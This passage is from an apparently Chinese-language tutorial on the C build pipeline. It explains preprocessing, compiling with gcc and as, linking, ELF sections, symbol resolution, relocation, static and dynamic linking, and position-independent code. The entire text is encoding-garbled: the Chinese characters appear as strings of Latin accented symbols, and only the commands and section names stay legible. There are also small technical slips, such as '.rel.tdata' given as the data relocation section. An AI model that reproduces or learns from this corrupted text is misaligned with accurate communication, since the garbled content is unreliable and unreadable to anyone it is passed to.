ä¸­ä»¥#å¼€å§‹çš„é¢„ç¼–è¯‘æŒ‡ä»¤ï¼Œä¸»è¦å¤„ç†è§„åˆ™å¦‚ä¸‹ï¼š å¤„ç†#includeé¢„ç¼–è¯‘æŒ‡ä»¤ï¼Œå°†è¢«åŒ…å«çš„æ–‡ä»¶æ’å…¥åˆ°è¯¥é¢„ç¼–è¯‘æŒ‡ä»¤çš„ä½ç½®ã€‚è¿™æ˜¯ä¸€ä¸ªé€’å½’çš„è¿‡ç¨‹ï¼Œå¦‚æœè¢«åŒ…å«çš„æ–‡ä»¶è¿˜åŒ…å«äº†å…¶ä»–æ–‡ä»¶ï¼Œä¼šé€’å½’åœ°å®Œæˆè¿™ä¸ªè¿‡ç¨‹ã€‚ å¤„ç†æ¡ä»¶é¢„ç¼–è¯‘æŒ‡ä»¤ï¼Œæ¯”å¦‚#ifã€#ifdefã€#elifã€#elseã€#endifã€‚ åˆ é™¤#defineï¼Œå±•å¼€æ‰€æœ‰å®å®šä¹‰ã€‚ æ·»åŠ è¡Œå·å’Œæ–‡ä»¶åæ ‡è¯†ï¼Œä»¥ä¾¿äºåœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­äº§ç”Ÿç¼–è¯‘é”™è¯¯æˆ–è€…è°ƒè¯•æ—¶éƒ½èƒ½å¤Ÿç”Ÿæˆè¡Œå·ä¿¡æ¯ã€‚ ç¼–è¯‘gccå¯¹é¢„å¤„ç†åçš„hello.iæ–‡ä»¶æƒŠé†’ç¼–è¯‘ã€‚ç¼–è¯‘çš„è¿‡ç¨‹ä¸»è¦æ˜¯è¿›è¡Œè¯æ³•åˆ†æã€è¯­æ³•åˆ†æã€è¯­ä¹‰åˆ†æï¼Œè¿™èƒŒåæ¶‰åŠç¼–è¯‘åŸç†ç­‰ä¸€äº›å†…å®¹ã€‚è¿™é‡Œåªè¿›è¡Œç¼–è¯‘ï¼Œä¸æ±‡ç¼–ï¼Œå¯ä»¥ç”Ÿæˆç¡¬ä»¶å¹³å°ç›¸å…³çš„æ±‡ç¼–è¯­è¨€ã€‚ 1$ gcc -S hello.i -o hello.s å®ƒåŒ…å«ä¸€ä¸ªæ±‡ç¼–è¯­è¨€ç¨‹åºï¼Œå³å°†Cè¯­è¨€ç¨‹åºç¼–è¯‘æˆæ±‡ç¼–è¯­è¨€ç¨‹åºã€‚ æ±‡ç¼–1$ as hello.s -o hello.o aså·¥å…·å°†hello.sæ–‡ä»¶ç¿»è¯‘ä¸ºäºŒè¿›åˆ¶ä»£ç ã€‚ è™½ç„¶è¿™ä¸ªæ–‡ä»¶å·²ç»æ˜¯äºŒè¿›åˆ¶çš„æœºå™¨ç äº†ï¼Œä½†æ˜¯å®ƒä»ç„¶ä¸èƒ½æ‰§è¡Œï¼Œå› ä¸ºå®ƒç¼ºå°‘ç³»ç»Ÿè¿è¡Œæ‰€å¿…é¡»çš„åº“ï¼Œæ¯”å¦‚Cè¯­è¨€printf()å¯¹åº”çš„æ±‡ç¼–è¯­è¨€çš„putså‡½æ•°ã€‚ç¡®åˆ‡çš„è¯´ï¼Œç³»ç»Ÿè¿˜ä¸çŸ¥é“putså‡½æ•°åœ¨å†…å­˜ä¸­çš„å…·ä½“ä½ç½®ã€‚å¦‚æœæˆ‘ä»¬åœ¨ä¸€ä»½æºä»£ç ä¸­ä½¿ç”¨äº†å¤–éƒ¨çš„å‡½æ•°æˆ–è€…å˜é‡ï¼Œè¿˜éœ€è¦é‡è¦çš„ä¸€æ­¥ï¼šé“¾æ¥ã€‚ é“¾æ¥1$ gcc hello.o -o hello è¯¥å‘½ä»¤æ˜¯åŸºäºåŠ¨æ€é“¾æ¥çš„æ–¹å¼ï¼Œç”Ÿæˆçš„helloå·²ç»æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚å®é™…ä¸Šï¼Œè¿™ä¸ªå‘½ä»¤éšè—äº†å¾ˆå¤šèƒŒåçš„å†…å®¹ã€‚ main()æ–¹æ³•æ˜¯Cè¯­è¨€ç¨‹åºçš„å…¥å£ï¼Œcrt1.oè¿™å‡ ä¸ªåº“æ˜¯åœ¨å¤„ç†main()æ–¹æ³•è°ƒç”¨ä¹‹å‰å’Œç¨‹åºé€€å‡ºä¹‹åçš„äº‹æƒ…ï¼Œè¿™éœ€è¦ä¸æ“ä½œç³»ç»Ÿåä½œã€‚åœ¨Linuxä¸­ï¼Œä¸€ä¸ªæ–°çš„ç¨‹åºéƒ½æ˜¯ç”±çˆ¶è¿›ç¨‹è°ƒç”¨fork()ï¼Œç”Ÿæˆä¸€ä¸ªå­è¿›ç¨‹ï¼Œç„¶åå†è°ƒç”¨execve()ï¼Œå°†å¯æ‰§è¡Œæ–‡ä»¶åŠ è½½è¿›æ¥ï¼Œæ‰èƒ½è¢«æ“ä½œç³»ç»Ÿæ‰§è¡Œã€‚æ‰€ä»¥ï¼Œå‡†ç¡®åœ°è¯´ï¼Œmain()æ–¹æ³•æ˜¯è¿™ä¸ªç¨‹åºçš„å…¥å£ï¼Œä½†ä»…ä»…ä»main()æ–¹æ³•å¼€å§‹ï¼Œå¹¶ä¸èƒ½é¡ºåˆ©æ‰§è¡Œè¿™ä¸ªç¨‹åºã€‚ é“¾æ¥å™¨å°†å¤šä¸ªç›®æ ‡æ–‡ä»¶åˆå¹¶æˆä¸€ä¸ªå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ï¼Œè¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶åŒ…å«åŠ è½½ç¨‹åºåˆ°å†…å­˜å¹¶è¿è¡Œçš„æ‰€æœ‰ä¿¡æ¯ã€‚ é“¾æ¥è¿‡ç¨‹ä¸»è¦åŒ…å«äº†ä¸¤ä¸ªæ­¥éª¤ï¼š åœ°å€ä¸ç©ºé—´åˆ†é…ï¼ˆAddress and Storage Allocationï¼‰ è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œ æ‰«ææ‰€æœ‰çš„è¾“å…¥ç›®æ ‡æ–‡ä»¶ï¼Œè·å¾—å®ƒä»¬çš„å„ä¸ªèŠ‚çš„é•¿åº¦ã€å±æ€§ã€ä½ç½®ï¼Œå¹¶å°†è¾“å…¥ç›®æ ‡æ–‡ä»¶ä¸­çš„ç¬¦å·è¡¨ä¸­æ‰€æœ‰çš„ç¬¦å·å®šä¹‰å’Œç¬¦å·å¼•ç”¨æ”¶é›†èµ·æ¥ï¼Œç»Ÿä¸€æ”¾åˆ°ä¸€ä¸ªå…¨å±€çš„ç¬¦å·è¡¨ã€‚è¿™ä¸€æ­¥ï¼Œé“¾æ¥å™¨èƒ½å¤Ÿè·å¾—æ‰€æœ‰è¾“å…¥ç›®æ ‡æ–‡ä»¶çš„èŠ‚çš„é•¿åº¦ï¼Œå¹¶å°†å®ƒä»¬åˆå¹¶ï¼Œè®¡ç®—å‡ºè¾“å‡ºæ–‡ä»¶ä¸­å„ä¸ªèŠ‚åˆå¹¶åçš„é•¿åº¦ä¸ä½ç½®ï¼Œå¹¶å»ºç«‹æ˜ å°„å…³ç³»ã€‚ è¿™é‡Œå¼•å…¥å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶çš„æ¦‚å¿µã€‚ .text:å·²ç¼–è¯‘ç¨‹åºçš„æœºå™¨ä»£ç  .rodata:åªè¯»æ•°æ® .data:å·²åˆå§‹åŒ–çš„å…¨å±€å’Œé™æ€Cå˜é‡ .bss:æœªåˆå§‹åŒ–çš„å…¨å±€å’Œé™æ€Cå˜é‡ .symtab: ç¬¦å·è¡¨ï¼Œå­˜æ”¾åœ¨ç¨‹åºä¸­å®šä¹‰å’Œå¼•ç”¨çš„å‡½æ•°å’Œå…¨å±€å˜é‡çš„ä¿¡æ¯ .debug:è°ƒè¯•ç¬¦å·è¡¨ å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„æ®µæ˜¯ç”±ç›®æ ‡æ–‡ä»¶ä¸­çš„èŠ‚åˆå¹¶è€Œæ¥çš„ï¼Œä»¥ä¸‹æ˜¯é“¾æ¥å™¨å¦‚ä½•å°†å®ƒä»¬çš„å„ä¸ªèŠ‚åˆå¹¶åˆ°è¾“å‡ºæ–‡ä»¶ï¼Œä¹Ÿå³è¾“å‡ºæ–‡ä»¶ä¸­çš„ç©ºé—´å¦‚ä½•åˆ†é…ç»™è¾“å…¥æ–‡ä»¶çš„ä¸¤ç§æ–¹å¼ã€‚ é¡ºåºå åŠ  è™½ç„¶è¿™ç§æ–¹æ³•éå¸¸ç®€å•ï¼Œä½†æ˜¯å®ƒå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼šåœ¨æœ‰å¾ˆå¤šè¾“å…¥æ–‡ä»¶çš„æƒ…å†µä¸‹ï¼Œè¾“å‡ºæ–‡ä»¶ä¼šæœ‰å¾ˆå¤šé›¶æ•£çš„èŠ‚ã€‚è¿™ç§åšæ³•éå¸¸æµªè´¹ç©ºé—´ï¼Œå› ä¸ºæ¯ä¸ªèŠ‚éƒ½éœ€è¦æœ‰ä¸€å®šçš„åœ°å€å’Œç©ºé—´å¯¹é½è¦æ±‚ã€‚x86ç¡¬ä»¶çš„å¯¹é½è¦æ±‚æ˜¯4KBã€‚å¦‚æœä¸€ä¸ªèŠ‚çš„å¤§å°åªæœ‰1ä¸ªå­—èŠ‚ï¼Œå®ƒä¹Ÿè¦åœ¨å†…å­˜åœ¨é‡ç”¨4KBã€‚è¿™æ ·ä¼šé€ æˆå¤§é‡å†…éƒ¨ç¢ç‰‡ã€‚æ‰€ä»¥ä¸æ˜¯ä¸€ä¸ªå¥½çš„æ–¹æ¡ˆã€‚ åˆå¹¶ç›¸ä¼¼èŠ‚ ä¸€ä¸ªæ›´åŠ å®é™…çš„æ–¹æ³•ä¾¿æ˜¯åˆå¹¶ç›¸åŒæ€§è´¨çš„èŠ‚ï¼Œæ¯”å¦‚ï¼šå°†æ‰€æœ‰è¾“å…¥æ–‡ä»¶çš„ .textèŠ‚åˆå¹¶åˆ°è¾“å‡ºæ–‡ä»¶çš„ textæ®µï¼ˆæ³¨æ„ï¼Œæ­¤æ—¶å‡ºç°äº†æ®µå’ŒèŠ‚ä¸¤ä¸ªæ¦‚å¿µï¼‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ å…¶ä¸­.bssèŠ‚åœ¨ç›®æ ‡æ–‡ä»¶å’Œå¯æ‰§è¡Œæ–‡ä»¶ä¸­ä¸å ç”¨æ–‡ä»¶çš„ç©ºé—´ï¼Œä½†æ˜¯å®ƒåœ¨è£…è½½æ—¶å ç”¨åœ°å€ç©ºé—´ã€‚äº‹å®ä¸Šï¼Œè¿™é‡Œçš„ç©ºé—´å’Œåœ°å€æœ‰ä¸¤å±‚å«ä¹‰: åœ¨è¾“å‡ºçš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ç©ºé—´ åœ¨è£…è½½åçš„è™šæ‹Ÿåœ°å€ä¸­çš„ç©ºé—´ å¯¹äºæœ‰å®é™…æ•°æ®çš„èŠ‚ï¼Œå¦‚.textå’Œ.dataï¼Œå®ƒä»¬åœ¨æ–‡ä»¶ä¸­å’Œè™šæ‹Ÿåœ°å€ä¸­éƒ½è¦åˆ†é…ç©ºé—´ï¼Œå› ä¸ºå®ƒä»¬åœ¨è¿™ä¸¤è€…ä¸­éƒ½å­˜åœ¨ï¼›å¯¹äº.bssæ¥ï¼Œåˆ†é…ç©ºé—´çš„æ„ä¹‰åªå±€é™äºè™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œå› ä¸ºå®ƒåœ¨æ–‡ä»¶ä¸­å¹¶æ²¡æœ‰å†…å®¹ã€‚æˆ‘ä»¬åœ¨è¿™é‡Œè°ˆåˆ°çš„ç©ºé—´åˆ†é…åªå…³æ³¨äºè™šæ‹Ÿåœ°å€ç©ºé—´ï¼ˆè§ä¸‹å›¾ï¼‰çš„åˆ†é…ï¼Œå› ä¸ºè¿™å…³ç³»åˆ°é“¾æ¥å™¨åé¢çš„å…³äºåœ°å€è®¡ç®—çš„æ­¥éª¤ï¼Œè€Œå¯æ‰§è¡Œæ–‡ä»¶æœ¬èº«çš„ç©ºé—´åˆ†é…ä¸é“¾æ¥çš„å…³ç³»å¹¶ä¸å¤§ã€‚ ç°åœ¨çš„é“¾æ¥å™¨ç©ºé—´åˆ†é…çš„ç­–ç•¥åŸºæœ¬ä¸Šéƒ½é‡‡ç”¨â€œåˆå¹¶ç›¸ä¼¼èŠ‚â€çš„æ–¹æ³•ï¼Œä½¿ç”¨è¿™ç§æ–¹æ³•çš„é“¾æ¥å™¨ä¸€èˆ¬é‡‡ç”¨ä¸€ç§å« ä¸¤æ­¥é“¾æ¥ï¼ˆTwo-pass Linkingï¼‰ çš„æ–¹æ³•ã€‚å³æ•´ä¸ªé“¾æ¥è¿‡ç¨‹åˆ†ä¸ºåœ°å€ä¸ç©ºé—´åˆ†é…å’Œç¬¦å·è§£æã€é‡å®šä½ã€‚ ç¬¦å·è§£æï¼ˆSymbol Resolutionï¼‰å’Œé‡å®šä½ï¼ˆRelocationï¼‰ ä½¿ç”¨å‰ä¸€æ­¥ä¸­æ”¶é›†åˆ°çš„æ‰€æœ‰ä¿¡æ¯ï¼Œè¯»å–è¾“å…¥æ–‡ä»¶ä¸­èŠ‚çš„è¾“æ•°æ®ã€é‡å®šä½ä¿¡æ¯ï¼Œå¹¶ä¸”è¿›è¡Œç¬¦å·è§£æä¸é‡å®šä½ã€è°ƒæ•´ä»£ç ã€è°ƒæ•´ä»£ç ä¸­çš„åœ°å€ç­‰ã€‚é‡å®šä½æ˜¯é“¾æ¥è¿‡ç¨‹çš„æ ¸å¿ƒã€‚åœ¨åœ°å€ä¸ç©ºé—´åˆ†é…æ­¥éª¤å®Œæˆä¹‹åï¼Œç›¸ä¼¼æƒé™çš„èŠ‚ä¼šè¢«åˆå¹¶æˆæ®µï¼Œå¹¶ç”Ÿæˆäº† ç¨‹åºå¤´è¡¨ï¼ˆProgram Header Tableï¼‰ ç»“æ„ã€‚å¦‚ä¸‹å›¾å¯æ‰§è¡Œæ–‡ä»¶ç»“æ„æ‰€ç¤ºï¼Œä¸»è¦ç”Ÿæˆä¸¤ä¸ªæ®µï¼šä»£ç æ®µï¼ˆ textæ®µï¼‰ã€æ•°æ®æ®µï¼ˆ dataæ®µ ï¼‰ã€‚ ç¬¦å·è§£æ é‡å®šä½çš„è¿‡ç¨‹æ˜¯ä¼´éšç€ç¬¦å·è§£æçš„ï¼Œè¿™é‡Œå…ˆä»‹ç»ç¬¦å·è§£æã€‚ é“¾æ¥å™¨è§£æç¬¦å·å¼•ç”¨çš„æ–¹æ³•æ˜¯å°†æ¯ä¸ªå¼•ç”¨ä¸å®ƒè¾“å…¥çš„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶çš„ç¬¦å·è¡¨ä¸­çš„ä¸€ä¸ªç¡®å®šçš„ç¬¦å·å®šä¹‰å…³è”èµ·æ¥ã€‚å¯¹é‚£äº›å’Œå¼•ç”¨å®šä¹‰åœ¨ç›¸åŒæ¨¡å—çš„å±€éƒ¨ç¬¦å·çš„å¼•ç”¨ï¼Œç¬¦å·è§£ææ˜¯éå¸¸ç®€å•çš„ã€‚ç¼–è¯‘å™¨åªå…è®¸æ¯ä¸ªæ¨¡å—ä¸­æ¯ä¸ªå±€éƒ¨ç¬¦å·æœ‰ä¸€ä¸ªå®šä¹‰ã€‚é™æ€å±€éƒ¨å˜é‡ä¹Ÿä¼šæœ‰æœ¬åœ°é“¾æ¥å™¨ç¬¦å·ï¼Œç¼–è¯‘å™¨è¿˜è¦ç¡®ä¿å®ƒä»¬æ‹¥æœ‰å”¯ä¸€çš„åå­—ã€‚ ç„¶è€Œï¼Œå¯¹äºå…¨å±€ç¬¦å·çš„è§£æè¦å¤æ‚å¾—å¤šã€‚å½“ç¼–è¯‘å™¨é‡åˆ°ä¸€ä¸ªä¸æ˜¯åœ¨å½“å‰æ¨¡å—ä¸­å®šä¹‰çš„ç¬¦å·ï¼ˆå˜é‡æˆ–å‡½æ•°åï¼‰æ—¶ï¼Œä¼šå‡è®¾è¯¥ç¬¦å·æ˜¯åœ¨å…¶ä»–æŸä¸ªæ¨¡å—ä¸­å®šä¹‰çš„ï¼Œç”Ÿæˆä¸€ä¸ªé“¾æ¥å™¨ç¬¦å·è¡¨æ¡ç›®ï¼Œå¹¶æŠŠå®ƒäº¤ç»™é“¾æ¥å™¨å¤„ç†ã€‚å¦‚æœé“¾æ¥å™¨åœ¨å®ƒçš„ä»»ä½•è¾“å…¥æ¨¡å—ä¸­éƒ½æ‰¾ä¸åˆ°è¿™ä¸ªè¢«å¼•ç”¨ç¬¦å·çš„å®šä¹‰ï¼Œå°±è¾“å‡ºä¸€æ¡é”™è¯¯ä¿¡æ¯å¹¶ç»ˆæ­¢ã€‚ å¤šé‡å®šä¹‰çš„å…¨å±€ç¬¦å·è§£æåœ¨æ­¤ä¸åšä»‹ç»ã€‚ é‡å®šä½ é“¾æ¥çš„å‰ä¸¤æ­¥å®Œæˆä¹‹åï¼Œé“¾æ¥å™¨å°±å·²ç»ç¡®å®šæ‰€æœ‰ç¬¦å·çš„è™šæ‹Ÿåœ°å€äº†ï¼Œé‚£ä¹ˆé“¾æ¥å™¨å°±å¯ä»¥æ ¹æ®ç¬¦å·çš„åœ°å€å¯¹æ¯ä¸ªéœ€è¦é‡å®šä½çš„æŒ‡ä»¤è¿›è¡Œåœ°å€ä¿®æ­£ã€‚ é‚£ä¹ˆé“¾æ¥å™¨å¦‚ä½•çŸ¥é“å“ªäº›æŒ‡ä»¤æ˜¯è¦è¢«è°ƒæ•´çš„å‘¢ï¼Ÿäº‹å®ä¸Šï¼Œæˆ‘ä»¬å‰é¢æåˆ°çš„ELFæ–‡ä»¶ä¸­çš„ é‡å®šä½è¡¨ï¼ˆRelocation Tableï¼‰ ä¸“é—¨ç”¨æ¥ä¿å­˜è¿™äº›ä¸é‡å®šä½ç›¸å…³çš„ä¿¡æ¯ã€‚ å¯¹äºå¯é‡å®šä½çš„ELFæ–‡ä»¶æ¥è¯´ï¼Œå®ƒå¿…é¡»åŒ…å«é‡å®šä½è¡¨ï¼Œç”¨æ¥æè¿°å¦‚ä½•ä¿®æ”¹ç›¸åº”çš„èŠ‚çš„å†…å®¹ã€‚å¯¹äºæ¯ä¸ªè¦è¢«é‡å®šä½çš„ELFèŠ‚éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„é‡å®šä½è¡¨ã€‚å¦‚æœ.textèŠ‚éœ€è¦è¢«é‡å®šä½ï¼Œåˆ™ä¼šæœ‰ä¸€ä¸ªç›¸å¯¹åº”å«.rel.textçš„èŠ‚ä¿å­˜äº†ä»£ç èŠ‚çš„é‡å®šä½è¡¨ï¼›å¦‚æœ.dataèŠ‚éœ€è¦è¢«é‡å®šä½ï¼Œåˆ™ä¼šæœ‰ä¸€ä¸ªç›¸å¯¹åº”çš„.rel.tdataçš„èŠ‚ä¿å­˜äº†æ•°æ®èŠ‚çš„é‡å®šä½è¡¨ã€‚ é“¾æ¥å¯åˆ†ä¸ºé™æ€é“¾æ¥å’ŒåŠ¨æ€é“¾æ¥ é™æ€é“¾æ¥ç®€å•æ¥è¯´ï¼Œé™æ€é“¾æ¥å°±æ˜¯åœ¨ç¨‹åºåŠ è½½å‰ï¼Œå°†æ‰€ä¾èµ–çš„ç¬¬ä¸‰æ–¹åº“å‡½æ•°éƒ½æ‰“åŒ…åˆ°äº†ä¸€èµ·ï¼Œå½¢æˆä¸€ä¸ªéå¸¸å¤§çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºä¸ºæœ€åŸºæœ¬çš„é™æ€é“¾æ¥è¿‡ç¨‹ç¤ºæ„å›¾ã€‚æ¯ä¸ªæ¨¡å—çš„æºä»£ç æ–‡ä»¶ï¼ˆå¦‚.cï¼‰æ–‡ä»¶ç»è¿‡ç¼–è¯‘å™¨ç¼–è¯‘æˆç›®æ ‡æ–‡ä»¶ï¼ˆObject Fileï¼Œä¸€èˆ¬æ‰©å±•åä¸º.oæˆ–.objï¼‰ã€‚ç›®æ ‡æ–‡ä»¶å’Œ åº“ï¼ˆLibraryï¼‰ ä¸€èµ·é“¾æ¥å½¢æˆæœ€ç»ˆçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚å…¶ä¸­ï¼Œæœ€å¸¸è§çš„åº“å°±æ˜¯è¿è¡Œæ—¶åº“ï¼ˆRuntime Libraryï¼‰ï¼Œå®ƒæ˜¯æ”¯æŒç¨‹åºè¿è¡Œçš„åŸºæœ¬å‡½æ•°çš„é›†åˆã€‚åº“æœ¬è´¨ä¸Šæ˜¯ä¸€ç»„ç›®æ ‡æ–‡ä»¶çš„åŒ…ï¼Œç”±ä¸€äº›æœ€å¸¸ç”¨çš„ä»£ç ç¼–è¯‘æˆç›®æ ‡æ–‡ä»¶åæ‰“åŒ…è€Œæˆã€‚ åŠ¨æ€é“¾æ¥åŠ¨æ€é“¾æ¥æ˜¯åœ¨è¿è¡Œæ—¶ï¼Œå‘ç°ç”¨åˆ°æŸäº›åº“ä¸­çš„æŸäº›å‡½æ•°æ—¶ï¼Œå†ä»è¿™äº›ç¬¬ä¸‰æ–¹åº“ä¸­è¯»å–è‡ªå·±æ‰€éœ€çš„æ–¹æ³•ã€‚ åŠ¨æ€é“¾æ¥çš„åŸºæœ¬å®ç° åŠ¨æ€é“¾æ¥æ¶‰åŠè¿è¡Œæ—¶çš„é“¾æ¥ä»¥åŠå¤šä¸ªæ–‡ä»¶çš„è£…è½½ï¼Œå¿…éœ€è¦æœ‰æ“ä½œç³»ç»Ÿçš„æ”¯æŒã€‚å› ä¸ºåŠ¨æ€é“¾æ¥çš„æƒ…å†µä¸‹ï¼Œè¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´çš„åˆ†å¸ƒä¼šæ¯”é™æ€é“¾æ¥æƒ…å†µä¸‹æ›´ä¸ºå¤æ‚ï¼Œè¿˜æœ‰ä¸€äº›å­˜å‚¨ç®¡ç†ã€å†…å­˜å…±äº«ã€è¿›ç¨‹çº¿ç¨‹ç­‰æœºåˆ¶åœ¨åŠ¨æ€é“¾æ¥ä¸‹ä¹Ÿä¼šæœ‰ä¸€äº›å¾®å¦™çš„å˜åŒ–ã€‚ ç›®å‰ï¼Œä¸»æµæ“ä½œç³»ç»Ÿéƒ½æ”¯æŒåŠ¨æ€é“¾æ¥ã€‚åœ¨Linuxä¸­ï¼ŒELFåŠ¨æ€é“¾æ¥æ–‡ä»¶è¢«ç§°ä¸º åŠ¨æ€å…±äº«å¯¹è±¡ï¼ˆDSOï¼ŒDynamic Shared Objectsï¼‰ï¼Œä¸€èˆ¬ä»¥.soä¸ºåç¼€ï¼›åœ¨Windowsä¸­ï¼ŒåŠ¨æ€é“¾æ¥æ–‡ä»¶è¢«ç§°ä¸º åŠ¨æ€é“¾æ¥åº“ï¼ˆDynamic Linking Libraryï¼‰ï¼Œä¸€èˆ¬ä»¥.dllä¸ºåç¼€ã€‚ åœ¨Linuxä¸­ï¼Œå¸¸ç”¨çš„Cè¯­è¨€åº“çš„è¿è¡Œåº“glibcï¼Œå…¶åŠ¨æ€é“¾æ¥å½¢å¼çš„ç‰ˆæœ¬ä¿ç•™åœ¨ /libç›®å½•ä¸‹ï¼Œæ–‡ä»¶åä¸º libc.soã€‚æ•´ä¸ªç³»ç»Ÿåªä¿ç•™ä¸€ä»½Cè¯­è¨€åŠ¨æ€é“¾æ¥æ–‡ä»¶libc.soï¼Œæ‰€æœ‰çš„Cè¯­è¨€ç¼–å†™çš„ã€åŠ¨æ€é“¾æ¥çš„ç¨‹åºéƒ½å¯ä»¥åœ¨è¿è¡Œæ—¶ä½¿ç”¨å®ƒã€‚å½“ç¨‹åºè¢«è£…è½½æ—¶ï¼Œç³»ç»Ÿçš„åŠ¨æ€é“¾æ¥å™¨ä¼šå°†ç¨‹åºæ‰€éœ€è¦çš„æ‰€æœ‰åŠ¨æ€é“¾æ¥åº“è£…è½½åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œå¹¶å°†ç¨‹åºä¸­æ‰€æœ‰æœªè§£æçš„ç¬¦å·ç»‘å®šåˆ°ç›¸åº”çš„åŠ¨æ€é“¾æ¥åº“ä¸­ï¼Œå¹¶è¿›è¡Œé‡å®šä½ã€‚ åŠ¨æ€é“¾æ¥ç¨‹åºè¿è¡Œæ—¶åœ°å€ç©ºé—´åˆ†å¸ƒ å¯¹äºé™æ€é“¾æ¥çš„å¯æ‰§è¡Œæ–‡ä»¶æ¥è¯´ï¼Œæ•´ä¸ªè¿›ç¨‹åªæœ‰ä¸€ä¸ªæ–‡ä»¶è¦è¢«æ˜ å°„ï¼Œå³å¯æ‰§è¡Œæ–‡ä»¶ã€‚è€Œå¯¹äºåŠ¨æ€é“¾æ¥ï¼Œé™¤äº†å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿˜æœ‰å®ƒæ‰€ä¾èµ–çš„å…±äº«ç›®æ ‡æ–‡ä»¶ã€‚ å…³äºå…±äº«ç›®æ ‡æ–‡ä»¶åœ¨å†…å­˜ä¸­çš„åœ°å€åˆ†é…ï¼Œä¸»è¦æœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼Œåˆ†åˆ«æ˜¯ï¼š é™æ€å…±äº«åº“ï¼ˆStatic Shared Libraryï¼‰ï¼ˆåœ°å€å›ºå®šï¼‰ åŠ¨æ€å…±äº«åº“ï¼ˆDynamic Shared Libaryï¼‰ï¼ˆåœ°å€ä¸å›ºå®šï¼‰ é™æ€å…±äº«åº“ é™æ€å…±äº«åº“çš„åšæ³•æ˜¯å°†ç¨‹åºçš„å„ä¸ªæ¨¡å—ç»Ÿä¸€äº¤ç»™æ“ä½œç³»ç»Ÿè¿›è¡Œç®¡ç†ï¼Œæ“ä½œç³»ç»Ÿåœ¨æŸä¸ªç‰¹å®šçš„åœ°å€åˆ’åˆ†å‡ºä¸€äº›åœ°å€å—ï¼Œä¸ºé‚£äº›å·²çŸ¥çš„æ¨¡å—é¢„ç•™è¶³å¤Ÿçš„ç©ºé—´ã€‚å› ä¸ºè¿™ä¸ªåœ°å€å¯¹äºä¸åŒçš„åº”ç”¨ç¨‹åºæ¥è¯´ï¼Œéƒ½æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥ç§°ä¹‹ä¸ºé™æ€ã€‚ ä½†æ˜¯é™æ€å…±äº«åº“çš„ç›®æ ‡åœ°å€ä¼šå¯¼è‡´åœ°å€å†²çªã€å‡çº§ç­‰é—®é¢˜ã€‚ åŠ¨æ€å…±äº«åº“ é‡‡ç”¨åŠ¨æ€å…±äº«åº“çš„æ–¹å¼ï¼Œä¹Ÿç§°ä¸ºè£…è½½æ—¶é‡å®šä½ï¼ˆLoad Time Relocationï¼‰ã€‚å…¶åŸºæœ¬æ€è·¯æ˜¯ï¼šåœ¨é“¾æ¥æ—¶ï¼Œå¯¹æ‰€æœ‰ç»å¯¹åœ°å€çš„å¼•ç”¨éƒ½ä¸ä½œé‡å®šä½ï¼Œè€ŒæŠŠè¿™ä¸€æ­¥æ¨è¿Ÿåˆ°è£…è½½æ—¶å†å®Œæˆã€‚ä¸€æ—¦æ¨¡å—è£…è½½åœ°å€ç¡®å®šï¼Œå³ç›®æ ‡åœ°å€ç¡®å®šï¼Œé‚£ä¹ˆç³»ç»Ÿå°±å¯¹ç¨‹åºä¸­æ‰€æœ‰çš„ç»å¯¹åœ°å€å¼•ç”¨è¿›è¡Œé‡å®šä½ã€‚ ä½†æ˜¯è¿™ç§æ–¹å¼ä¹Ÿå­˜åœ¨ä¸€äº›é—®é¢˜ã€‚æ¯”å¦‚ï¼ŒåŠ¨æ€é“¾æ¥æ¨¡å—è¢«è£…è½½æ˜ å°„è‡³è™šæ‹Ÿç©ºé—´åï¼ŒæŒ‡ä»¤éƒ¨åˆ†æ˜¯åœ¨å¤šä¸ªè¿›ç¨‹é—´å…±äº«çš„ï¼Œç”±äºè£…è½½æ—¶é‡å®šä½çš„æ–¹æ³•éœ€è¦ä¿®æ”¹æŒ‡ä»¤ï¼Œæ‰€ä»¥æ²¡æœ‰åŠæ³•åšåˆ°åŒä¸€ä»½æŒ‡ä»¤è¢«å¤šä¸ªè¿›ç¨‹å…±äº«ï¼Œå› ä¸ºæŒ‡ä»¤è¢«é‡å®šä½åå¯¹äºæ¯ä¸ªè¿›ç¨‹æ¥è¯´éƒ½æ˜¯ä¸åŒçš„ã€‚ ç„¶åï¼ŒåŠ¨æ€é“¾æ¥åº“ä¸­çš„ä»£ç æ˜¯å…±äº«çš„ï¼Œä½†æ˜¯å…¶ä¸­çš„å¯ä¿®æ”¹æ•°æ®éƒ¨åˆ†å¯¹äºä¸åŒè¿›ç¨‹æ¥è¯´æ˜¯ç”±å¤šä¸ªå‰¯æœ¬çš„ã€‚åŸºäºæ­¤ï¼Œä¸€ç§åä¸ºåœ°å€æ— å…³ä»£ç çš„æŠ€æœ¯è¢«æå‡ºä»¥å…‹æœè¿™ä¸ªé—®é¢˜ã€‚ ä¸åœ°å€æ— å…³ æ— è®ºä½•ç§æ“ä½œç³»ç»Ÿä¸Šï¼Œä½¿ç”¨åŠ¨æ€é“¾æ¥ç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶ä¸­å‡¡æ˜¯æ¶‰åŠç¬¬ä¸‰æ–¹åº“çš„å‡½æ•°è°ƒç”¨éƒ½æ˜¯åœ°å€æ— å…³çš„ã€‚æˆ‘ä»¬è‡ªå·±ç¼–å†™çš„ç¨‹åºåä¸ºhello.cï¼Œhello.cä¸­è°ƒç”¨äº†Cæ 